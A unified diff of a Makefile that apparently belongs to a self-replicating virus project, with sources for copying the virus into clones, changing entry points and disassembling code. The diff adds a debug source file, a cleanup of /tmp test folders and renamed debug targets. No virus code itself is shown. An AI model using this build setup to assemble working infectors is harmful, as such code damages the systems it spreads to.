@@ -15,6 +15,7 @@ SRC =	loader.s                       \
 	virus/change_entry.c           \
 	virus/copy_virus_to_clone.c    \
 	virus/copy_client_to_clone.c   \
+	virus/debug.c                  \
 	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
 	virus/disasm_operands.c        \
@@ -89,6 +90,7 @@ ${NAME}: ${OBJ}
 	@${CC} ${LDFLAGS} -o $@ ${OBJ}
 	@echo ${G}Success"   "[${NAME}]${X}
 	mkdir -p /tmp/test /tmp/test2
+	rm /tmp/test/* /tmp/test2/*
 	cp /bin/ls /tmp/test/
 
 ${OBJDIR}/%.o: ${SRCDIR}/%.s
@@ -111,8 +113,8 @@ logs: fclean
 errors: fclean
 	${MAKE} all CFLAGS:="-DERRORS -g" ASFLAGS:="-DERRORS -g"
 
-debug: fclean
-	${MAKE} all CFLAGS:="-DDEBUG -g" ASFLAGS:="-DDEBUG -g"
+debug_blocks: fclean
+	${MAKE} all CFLAGS:="-DDEBUG_BLOCKS -g" ASFLAGS:="-DDEBUG_BLOCKS -g"
 
 debug_operands: fclean
 	${MAKE} all CFLAGS:="-DDEBUG_OPERANDS -g" ASFLAGS:="-DDEBUG_OPERANDS -g"
